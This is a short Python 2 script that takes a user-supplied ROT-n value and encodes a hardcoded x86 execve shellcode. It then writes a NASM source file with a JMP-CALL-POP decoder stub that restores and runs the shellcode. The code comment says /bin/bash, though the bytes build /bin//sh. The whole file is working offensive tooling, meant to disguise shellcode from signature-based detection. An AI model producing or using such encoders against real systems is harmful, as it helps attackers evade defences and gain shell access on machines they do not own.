# This script writes out a nasm execve shellcode file encoded user provided ROTn 
#!/usr/bin/env python

import sys

total = len(sys.argv)

# check for argv
if total != 2:
    print "[+] Usage %s [rot-n]" % sys.argv[0]
    sys.exit()

# convert argv to rot variable and check range consistency
rot = int(sys.argv[1])

if rot not in range(1,257):
     print "[+] Please insert a ROT value between 1 and 256"
     sys.exit()
else:
    #execve /bin/bash
    shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
                 "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
    
    n = rot # rot-n
    rot_hex = str((format(n, '02x')))
    max_value_without_wrapping = 256 - n

    encoded_shellcode = ""
    db_shellcode = []

    for x in bytearray(shellcode):
        if x < max_value_without_wrapping:
            encoded_shellcode += '\\x%02x' % (x + n)
            db_shellcode.append('0x%02x' % (x + n))
        else:
            encoded_shellcode += '\\x%02x' % (n - 256 + x)
            db_shellcode.append('0x%02x' % (n - 256 + x))
   
    encoded_nasm = ','.join(db_shellcode)
    print "Encoded shellcode:\n%s\n" % (encoded_shellcode)
    print "DB formatted (paste in .nasm file):\n%s\n" % ','.join(db_shellcode)

    print "Encoding file with \nROT%s\n" % (rot)
    f = open('rot%s-encoded-shellcode.nasm' %n, 'w')
    f.write('global _start\n\n')
    f.write('section .text\n\n')
    f.write('_start:\n')
    f.write('\tjmp short call_decoder\n\n')
    f.write('decoder:\n')
    f.write('\tpop esi\n') 
    f.write('\txor ecx, ecx\n')
    f.write('\tmov cl, len \n\n')
    f.write('decode:\n')
    f.write('\tcmp byte [esi], 0x%s\n' % rot_hex)     
    f.write('\tjl wrap_around\n')            
    f.write('\tsub byte [esi], 0x%s\n' % rot_hex)   
    f.write('\tjmp short process_shellcode\n\n')
    f.write('wrap_around:\n')
    f.write('\txor edx, edx\n')         
    f.write('\tmov dl, 0x%s\n' % rot_hex)   
    f.write('\tsub dl, byte [esi]\n')  
    f.write('\txor ebx,ebx\n')       
    f.write('\tmov bl, 0xff\n')       
    f.write('\tinc ebx\n')
    f.write('\tsub bx, dx\n')             
    f.write('\tmov byte [esi], bl\n\n')    
    f.write('process_shellcode:\n')   
    f.write('\tinc esi\n')              
    f.write('\tloop decode\n')      
    f.write('\tjmp short shellcode\n\n')   
    f.write('call_decoder:\n')
    f.write('\tcall decoder\n')
    f.write('\tshellcode:\n')
    f.write('\tdb %s\n' % encoded_nasm) 
    f.write('\tlen: equ $-shellcode\n')
    f.close()

